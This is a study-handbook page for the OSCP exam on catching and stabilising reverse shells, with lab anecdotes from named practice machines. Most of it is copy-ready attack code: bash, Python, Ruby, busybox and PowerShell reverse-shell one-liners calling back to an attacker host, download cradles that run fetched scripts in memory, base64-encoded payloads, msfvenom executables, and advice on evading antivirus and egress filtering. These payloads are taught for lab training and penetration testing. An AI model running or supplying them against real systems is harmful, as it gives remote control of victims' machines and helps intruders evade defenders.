---
title: "Reverse Shells"
slug: reverse-shells
category: notes
handbook: oscp
tags: ["shells"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "A reverse shell makes the target connect back to a listener on the attacker."
---
A reverse shell makes the target connect back to a listener on the attacker. This works when the target can reach out even if inbound connections to it are filtered, which is the common case behind NAT or a firewall.

Two things have to line up:

1. A listener running on the attacker.
2. A payload on the target that connects back to the attacker's IP and listener port.

## Listener

Netcat is the default catcher; flag meanings and the `-k` repeat option are in [nc](/collections/oscp/nc):

```bash
nc -lvnp 8000
```

- `-l`: Listen for a connection.
- `-v`: Verbose, so the connection source is printed.
- `-n`: No DNS resolution.
- `-p`: Listen on this port.

Start the listener before firing the payload. A successful catch prints the source address, for example `connect to [KALI] from (UNKNOWN) [TARGET]`.

### Address already in use

`nc` refuses to bind and loops on:

```text
retrying local 0.0.0.0:8080 : Address already in use
```

Something already owns that port. Find out what before killing anything:

```bash
sudo ss -ltnp 'sport = :8080'
```

The output names the process and PID, for example `users:(("java",pid=23297,fd=36))`. Then decide:

- **It is a stale `nc` or a leftover `python3 -m http.server`**: kill it and reuse the port.
  ```bash
  sudo kill <PID>        # -9 if it will not die
  sudo fuser -k 8080/tcp # or kill whatever holds the port in one shot
  ```
- **It is `java` on `127.0.0.1:8080`**: that is Burp's proxy listener. Do not kill it. Either catch on a different port (`nc -lvnp 9001`), or move Burp's listener under Proxy settings and take `8080` back.

Burp binds loopback only (`127.0.0.1:8080`), so it can never receive a shell from the target, but `nc` binding `0.0.0.0:8080` still collides at the port level, and the error appears even though Burp is local. The port number in a payload rarely matters as long as egress allows it, so switching the listener to a free port is usually faster than freeing `8080`. To avoid the conflict entirely, keep the catch listener on a fixed port (`443`, `80`, `9001`) and close it with `Ctrl-C` before relaunching so it does not leak.

## Payloads

`KALI` in the payloads is the attacker's address, the port matches the listener.

```bash
# bash
bash -i >& /dev/tcp/KALI/8000 0>&1

# sh (only where /bin/sh is bash; dash fails this, see below)
sh -i >& /dev/tcp/KALI/8000 0>&1

# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("KALI",8000));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# ruby (guaranteed on a Ruby app, avoids depending on which shell parses the line)
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("KALI",8000))'
```

Quote the string arguments in the Ruby payload: a bare `sh` or a bare IP is a Ruby identifier and raises `NameError`.

`>& /dev/tcp/KALI/PORT 0>&1` redirects stdin, stdout, and stderr over a TCP socket that the shell opens. Both `>&` and `/dev/tcp` are bash features, not POSIX.

For anything more exotic, generate one at revshells.com and pick a payload that matches the interpreters actually present on the target.

### Match the payload to the shell: Bad fd number

`>&` and `/dev/tcp/HOST/PORT` only work in bash. Whether they work depends on which shell actually parses the line, which is not always the shell named in the command:

- In a script, the interpreter is the one in the shebang (`#!/bin/sh` vs `#!/bin/bash`).
- `sh` is bash on some systems and dash on others. On Debian and Ubuntu, `/bin/sh` is dash; on RHEL and CentOS it is usually bash.

Under dash, `sh -i >& /dev/tcp/KALI/PORT 0>&1` fails with:

```text
Syntax error: Bad fd number
```

dash reads `>&` as "duplicate this file descriptor" and expects a number after it, so the hostname token is rejected. The same one-liner runs fine where `/bin/sh` is bash. On Twiggy the prompt was `sh-4.2#`, so `/bin/sh` was bash 4.2 and `sh -i >&` worked. On Sar the target was Ubuntu, so a `#!/bin/sh` script ran under dash and threw `Bad fd number` until the shebang was changed to bash. On Shakabrah a command injection ran the payload through Ubuntu's `/bin/sh`, so the `/dev/tcp` one-liner returned 200 but never called back, and a busybox payload was used instead. On RubyDome a pdfkit injection ran the command through the shell `wkhtmltopdf` was spawned under, where bash `/dev/tcp` failed; because the app is Ruby, the `ruby -rsocket` `TCPSocket` payload above was the reliable choice.

Fixes:

```sh
# Force bash for the whole script
#!/bin/bash
bash -i >& /dev/tcp/KALI/8000 0>&1
```

If bash is not available, use a POSIX-safe payload that avoids `>&` and `/dev/tcp`:

```sh
# mkfifo + netcat, works under dash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc KALI 8000 > /tmp/f
```

busybox is often present even where a full `nc` is not, and its `nc` applet supports `-e`. This avoids both `>&`/`/dev/tcp` and the fifo:

```sh
busybox nc KALI 8000 -e sh
```

On Shakabrah this was the payload that caught after the dash `/dev/tcp` attempt failed.

### Windows payloads

Windows targets rarely have bash or `/dev/tcp`, so the one-liners above do not apply. PowerShell is present everywhere and is the default choice. A self-contained reverse shell, run through `cmd` or any command-execution primitive:

```powershell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('KALI',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

- `-nop`: no profile, so a slow or broken user profile cannot interfere.
- `-w hidden`: no visible window.
- `-c`: run the following command.

Passing that much quoted PowerShell through a URL or an API parameter breaks on escaping. Two ways around it:

**Download cradle.** Put the reverse shell script body in a `.ps1` on Kali: the `$c=New-Object...` line above alone, without the `powershell -nop -w hidden -c` wrapper, since the cradle command itself already invokes PowerShell. Serve it, and pull it straight into memory. The command sent to the target stays short and quote-free:

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI/rev.ps1')"
```

Serve `rev.ps1` with `sudo python3 -m http.server 80` from the folder holding it. `IEX` executes the downloaded script without writing it to disk, so nothing lands on the filesystem for AV to scan.

**Base64.** Encode the reverse shell script alone, the part inside `-c`, as UTF-16LE base64 and pass it with `-enc`. This strips every quote and special character out of the command line:

```bash
echo -n '<powershell reverse shell script>' | iconv -t UTF-16LE | base64 -w0
```

```powershell
powershell -nop -w hidden -enc <base64>
```

When a static binary is easier, upload `nc.exe` (see [File Transfers](/collections/oscp/file-transfers)) and use its `-e`:

```powershell
nc.exe -e cmd.exe KALI 443
```

Or build a standalone executable with msfvenom, upload it, and run it:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o shell.exe
```

`shell_reverse_tcp` is stageless and catches on a plain `nc -lvnp 443`; the staged `shell/reverse_tcp` spelling would need a Metasploit handler instead, and the other formats and options are in [msfvenom](/collections/oscp/msfvenom). A stageless exe is not guaranteed usable, though: on Billyboss a freshly generated `windows/x64/shell_reverse_tcp` exe launched by GodPotato connected back and then sat silent, no prompt, no response to input. The `nc.exe 443 -e cmd.exe` shape through the same GodPotato invocation worked immediately, so when a payload exe gives a dead connection, switch to the nc shape rather than debugging the exe. `nc.exe` and msfvenom executables are both well-known AV signatures, so prefer the in-memory download cradle when Defender is active. Stabilizing a caught Windows shell is covered under [Windows shells](#windows-shells) below.

### pentestmonkey's php-reverse-shell.php does not run on Windows

The standard PHP reverse shell is Linux-only, and it fails in a way that looks like a working shell. Dropped on a Windows PHP stack such as XAMPP it connects back, prints a few lines, and dies:

```text
Warning: Undefined variable $daemon in C:\xampp\htdocs\uploads\revshell.text on line 111
WARNING: Failed to daemonise. This is quite common and not fatal.
Successfully opened reverse shell to 192.168.45.155:80
ERROR: Shell process terminated
```

On the listener the connection lands and produces one line:

```text
'uname' is not recognized as an internal or external command,
operable program or batch file.
```

Three separate Windows problems:

- `$daemon` is only assigned inside `if (function_exists('pcntl_fork'))`. Windows PHP has no `pcntl`, so `printit()` references an unset variable. Harmless, but it identifies the platform before anything else does.
- The script's default is `$shell = 'uname -a; w; id; /bin/sh -i';`, and `proc_open` on Windows runs the command through `cmd.exe /c`. cmd attempts `uname`, fails, and that error is what comes back over the socket. It is the payload's own preamble, not the operator's input being echoed. `;` is not a cmd separator either, so the whole string is one invalid command.
- The relay loop calls `stream_select()` on `proc_open` pipes, which Windows PHP does not support for pipes. Editing `$shell` to `cmd.exe` therefore does not fix it.

Replace the payload rather than patching it. Ivan Sincek's PHP reverse shell detects the OS and drives `cmd.exe` on Windows, working around the asynchronous pipe limitation that the pentestmonkey script hits:

```bash
cd ~/OSCP/tools
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
```

Set the address and port inside the file, upload it under whatever extension the target executes, and catch it normally. Keep a copy alongside the Kali one at `/usr/share/webshells/php/php-reverse-shell.php`, which is the Linux-only version.

A `<?php system($_GET['cmd']); ?>` webshell plus the PowerShell download cradle above reaches the same place and is the fallback when the reverse shell script itself is filtered. Either way, the failed attempt is still useful, since connecting at all proves the callback port is allowed outbound.

## From a Command-Execution Primitive

A foothold does not always begin as a shell. A webshell, a SQL UDF, a cron job, a template injection ([Server-Side Template Injection](/collections/oscp/server-side-template-injection)), or any bug that runs a single command is a command-execution primitive. Each one becomes an interactive session by running a reverse shell payload through it and catching it on the listener.

Which shell interprets the payload matters, because these primitives rarely invoke bash directly:

- **Webshell** (a `cmd=` parameter): the command runs through whatever the web server shells out to, often `/bin/sh`. URL-encode the payload, including `|` as `%7C`, `&` as `%26`, and spaces as `+`.
- **MySQL UDF** (`sys_exec`, `sys_eval`): the function calls C `system()`, which runs `/bin/sh`. On Debian and Ubuntu that is dash, so a bare `>&` payload hits the `Bad fd number` trap described above. Force bash:

```sql
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/KALI/443 0>&1"');
```

Elevating a MySQL DBA account to an OS shell this way is covered in [MySQL Privilege Escalation](/collections/oscp/mysql-privilege-escalation).

- **Cron or a root-run script**: write the payload into the script the job executes and wait for the next run. See [Cron Jobs](/collections/oscp/cron-jobs).
- **Windows command endpoint** (an API or app that runs a command, sometimes as SYSTEM): the command runs through `cmd` or PowerShell. Quoting a full PowerShell payload through a URL breaks on escaping, so either send the short download cradle or `-enc` blob from the Windows payloads above, or drop a binary and run it. Let `curl` encode the query instead of hand-typing `%20`:

  ```bash
  # named parameter (the common case), cmd=<command>
  curl -G "http://TARGET/" --data-urlencode "cmd=C:/Temp/nc.exe -e cmd.exe KALI 443"

  # no parameter name, the query string itself is the command (?<command>)
  curl -G "http://TARGET/" --data-urlencode "=C:/Temp/nc.exe -e cmd.exe KALI 443"
  ```

  With a named parameter use `name=content`. A leading `=` with no name sends a nameless query, which is what a `?<command>` endpoint expects. Find the parameter name first with a harmless command (`?whoami` vs `?cmd=whoami`), since the wrong shape gets echoed back as an error instead of running. Do not prefix an absolute path with `.\`, which PowerShell rejects as `.\C:/...`, and prefer forward slashes in Windows paths to avoid backslash escaping. On Nickel a loopback endpoint whose parameter was the bare query string ran as SYSTEM, so `nc.exe -e cmd.exe` through it returned a SYSTEM shell.

The pattern is the same across all of them: the primitive runs one command, so make that command a reverse shell, and force bash when the default shell is dash.

## Quoting the Payload on the Attacker Shell

When a payload is passed to an exploit script as an argument, it goes through the local shell first. Two layers of quoting are in play: zsh or bash parsing the command line on Kali, and whatever shell on the target eventually runs the string. Most "the exploit is broken" moments are actually the payload being mangled on the way out.

### Single quotes do not nest

```bash
python exploit.py TARGET 25 'python -c 'import socket...''
```

```text
zsh: parse error near `()'
```

The string ends at the second `'`, so `import socket...` is left as bare shell code and the parentheses blow up. Escape the inner quotes by closing, escaping, and reopening (`'\''`):

```bash
python exploit.py TARGET 25 'python -c '\''import socket;s=socket.socket()'\'''
```

### Backticks are not a quoting fix

Swapping the outer quotes for backticks makes the parse error disappear, because the content of a backtick block is parsed as a fresh shell script and the nested quotes become legal again. It also runs the payload locally instead of passing it to the exploit:

```bash
python exploit.py TARGET 25 `python -c 'import socket;...'`   # runs on Kali
```

The reverse shell then connects the attacker box to its own listener. The tell is a catch whose source address equals the listener's own address, and a `whoami` of `kali`:

```text
connect to [192.168.45.157] from (UNKNOWN) [192.168.45.157] 48496
$ whoami
kali
```

The exploit has not run at all at that point; the shell is still blocked waiting for the substitution to finish. This happened on Bratarina. If a quoting error goes away after switching to backticks or `$(...)`, the payload is being executed, not quoted.

### Wrapped pastes introduce newlines

Copying a long one-liner out of a chat window or a note can bring real line breaks and leading indentation with it. Inside single quotes those newlines are literal characters in the payload. Over a line-oriented protocol they split one command into two, which on Bratarina produced `500 5.5.1 Invalid command: Pipelining not supported`. Check before firing:

```bash
echo "$PAYLOAD" | wc -l    # 1
```

### Base64 to sidestep all of it

Encoding removes every quote, space-sensitive construct, and metacharacter from the string that gets typed and from the string the target's shell re-parses. Build it in two short lines so nothing can wrap:

```bash
B64=$(printf %s 'bash -i >& /dev/tcp/KALI/80 0>&1' | base64 -w0)
python exploit.py TARGET 25 "echo $B64 | base64 -d | bash"
```

`printf %s` rather than `echo`, since a trailing newline in the blob breaks some injection points. Decode with `| bash` when the payload uses `>&` or `/dev/tcp`, since those are bash-only, and `| sh` otherwise.

### Confirm the attacker IP first

A VPN reconnect hands out a new lease, and every payload built before that point still carries the old address. The exploit will report success and nothing will call back. On Bratarina several attempts were fired at the pre-reconnect address after the VPN had already moved on.

```bash
ip a show tun0
```

## Choosing the Callback Port

A reverse shell only connects if the target is allowed to reach the attacker on that port outbound. Egress firewalls often block arbitrary high ports.

Symptom: the payload runs, the exploit reports success, but the listener never receives a connection.

Fix: use a port that outbound rules are likely to permit. Good candidates are `80`, `443`, `8000`, and `53`. On Twiggy, a callback to `9001` was silently dropped while `8000` connected, because the target already allowed traffic on `8000`. On Bratarina the reverse was true: `443` was filtered outbound and `80` connected immediately with the same payload and the same exploit. On Roquefort `80` was blocked outbound for the cron privesc payload, even after the script and permissions were confirmed correct. Initial access had caught on `2222`, privesc landed on `22`. There is no port that is always safe, so retry on `80`, `443`, and a port already known open on the target before suspecting the payload. Ports under 1024 need `sudo` on the listener.

A port already shown open in the target's own nmap scan is another candidate worth trying. Egress rules are often a short blocklist of the obvious callback ports rather than a real allowlist, so a port the box already uses for one of its own services is less likely to be on that blocklist.

## Stabilizing the Shell

A raw catch is not a real terminal. `Tab` completion, the `Up`/`Down` history, and arrow keys do nothing, and `Ctrl-C` kills the whole shell instead of the current command. The `sh: no job control in this shell` message is the same problem.

Upgrade to a proper PTY:

```bash
# 1. Spawn a PTY on the target (use python if python3 is absent)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Set a terminal type so clear, less, and editors work
export TERM=xterm

# 3. Background the shell
# press Ctrl-Z

# 4. On Kali, hand the local terminal's raw input to the remote shell, then foreground it
stty raw -echo; fg
# press Enter twice
```

After this, `Tab`, history, and `Ctrl-C` behave normally.

Set the size so full-screen programs render correctly. Read the local values with `stty -a` on Kali, then apply them in the reverse shell:

```bash
stty rows 50 cols 200
```

If the shell dies during the upgrade, run `reset` in the local terminal to restore it.

### Raw mode after the remote end dies

After `stty raw -echo` the local terminal no longer processes keys itself. Every keystroke, including `Enter`, `Ctrl-C`, and `Ctrl-D`, is sent straight down the socket to the remote shell. That is the whole point of raw mode, and it is fine while the connection is alive. It becomes a trap when the remote end goes away, most commonly when a lab machine is reverted or stopped mid-session. The socket now points at nothing, so keys go into the void and nothing echoes back. `Ctrl-C` and `Ctrl-D` appear as literal `^C` and `^D` on screen because they are no longer being interpreted locally. The terminal is not frozen, it is talking to a dead peer.

Nothing typed into that tab will recover it, so kill the connection from outside:

```bash
# in a second terminal
pkill nc          # or pkill ssh, whichever made the connection
```

Killing the local `nc` or `ssh` process drops the dead tab back to a prompt. Then `reset` if it is left garbled. For `ssh` specifically there is an in-band escape that works even in raw mode: press `Enter`, then type `~.` to force the client to close. `nc` has no such escape; the second terminal is the only clean exit.

The practical consequence is to collect proof and any loot before stopping the machine, since a stopped box takes the shell down with it and there is no way to read anything more out of that session.

### When the prompt is not a shell

Public exploits often print a prompt and accept commands without ever giving a shell. Each line is sent as a separate request to a webshell or a poisoned file, output is scraped from the response, and the process exits. Nothing persists between commands, so `cd` does not move, and there is no stdin at all: `pty.spawn` hangs with no output because it starts an interactive shell and waits on input that can never arrive, and `sudo` reports `a terminal is required to read the password`. Jordak labels this honestly as `PSEUDO-TERM`, Astronaut presents it as a plain `$`.

The fix is to stop stabilizing it and use it once, to send a reverse shell one-liner. A real socket is a real shell, and the normal PTY upgrade works on it.

### When the upgrade crashes the target

Some footholds are not a separate process but code running inside the target service itself, for example a payload injected into a web server's own scripting engine. Spawning a PTY from inside such a shell can take the whole service down instead of just the shell. On Hub the reverse shell was a Lua payload executing inside the FuguHub server process, and the `pty.spawn` plus `stty raw -echo` upgrade crashed the server every time, dropping the connection and forcing a revert. When stabilization keeps killing the box, leave the raw shell as is, run non-interactive commands, and read the flag with a single `cat /root/proof.txt`.

### Windows shells

The PTY upgrade above is Linux only, it needs `/bin/bash` and a Unix PTY. A `cmd.exe` shell caught over netcat has no equivalent trick. Wrap the listener in `rlwrap` so the caught shell gets readline, meaning arrow-key history and line editing:

```bash
rlwrap nc -lvnp 4444
```

Arrows printing `^[A` in an unwrapped shell are not a broken connection. History, tab completion, and F7 belong to the Windows console host (`conhost.exe`), not to `cmd.exe`. Redirecting the standard handles to a socket attaches no console, so `cmd` reads plain lines from a pipe and an arrow key arrives as its literal escape sequence.

`rlwrap` only wraps the local listener, so it returns history of lines typed on Kali and nothing else. Tab completion and console behaviour on the target are unchanged. That was enough on Kevin, where the foothold was already SYSTEM and the shell only had to run a few commands, and not enough on Hutch.

### Pastes arriving as [200~

A pasted command that fails with the paste markers still attached is bracketed paste leaking down the socket:

```text
^[select samaccountname,serviceprincipalname^[[201~
'Get-NetUser' is not recognized as an internal or external command,
```

The terminal wraps pasted text in `ESC[200~` and `ESC[201~` so the receiving program can tell a paste from typing, and it does so only when that program enables the mode with `ESC[?2004h`. readline 8.1 and later enable it by default, so `rlwrap` turns it on, while the `cmd.exe` at the far end of the socket neither requested it nor knows to strip it. The markers are sent as ordinary characters and become part of the command.

Turn it off in readline. Scope it to the listener with `INPUTRC` rather than editing `~/.inputrc`, so the setting does not follow into every other readline program:

```bash
printf 'set enable-bracketed-paste off\n' > ~/.inputrc.revshell
```

```bash
revshell() { sudo INPUTRC="$HOME/.inputrc.revshell" rlwrap nc -lvnp "${1:-443}"; }
```

`sudo rlwrap` and not `rlwrap sudo`: wrapping sudo puts readline in front of the password prompt, which echoes the password in clear text and asks twice.

A global `~/.inputrc` is the blunter option and its effect is easy to misjudge. zsh does not use readline at all, so on a default Kali the line changes nothing about the interactive prompt, and the programs it does reach are bash, the python REPL, `mysql`, and `gdb`, where multi-line pastes go back to running line by line as they arrive.

All of this is a workaround for having readline in front of a raw socket. The real fix is [ConPtyShell](#windows-shells) where the build supports it: a plain `nc` listener never enables bracketed paste in the first place, and the far end becomes a console that handles pastes itself. Dropping `rlwrap` alone also stops the markers, at the cost of the line history that was the reason for wrapping.

The setting applies to the next `rlwrap`, not the running one. To clear the mode on a live session without re-catching the shell, send the disable sequence to that terminal from another one:

```bash
tty                                  # in the affected tab
printf '\033[?2004l' > /dev/pts/N
```

The fix is ConPtyShell, which allocates a real pseudoconsole through the Windows ConPTY API. That API exists from build 17763 (Windows 10 1809, Server 2019) onward, so read `CurrentBuildNumber` first as in [Windows Token Privileges](/collections/oscp/windows-token-privileges). Below it, `rlwrap` is the ceiling.

```bash
cd ~/OSCP/tools
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
sudo python3 -m http.server 80
```

The listener sends its own dimensions down the socket before handing over, which is what `stty size` does here:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Then from the existing unstable shell:

```cmd
powershell -c "IEX(IWR http://KALI/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp KALI -RemotePort 3001"
```

When Defender blocks the in-memory load, write it to disk instead:

```cmd
certutil -urlcache -split -f http://KALI/Invoke-ConPtyShell.ps1 C:\Windows\Temp\c.ps1
powershell -ep bypass -c "Import-Module C:\Windows\Temp\c.ps1; Invoke-ConPtyShell -RemoteIp KALI -RemotePort 3001"
```

The result is a real console: arrows, tab completion, `Ctrl-C`, and programs that prompt such as `runas`. `stty raw -echo` leaves the local terminal raw afterwards, so run `reset` when the session ends.

### Alternatives

When python is not available:

```bash
# Spawn a PTY with script
script -qc /bin/bash /dev/null
```

For a fully interactive session without the `stty` dance, use `socat` on both ends when it is present on the target:

```bash
# Listener on Kali
socat file:`tty`,raw,echo=0 tcp-listen:8000

# Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:KALI:8000
```
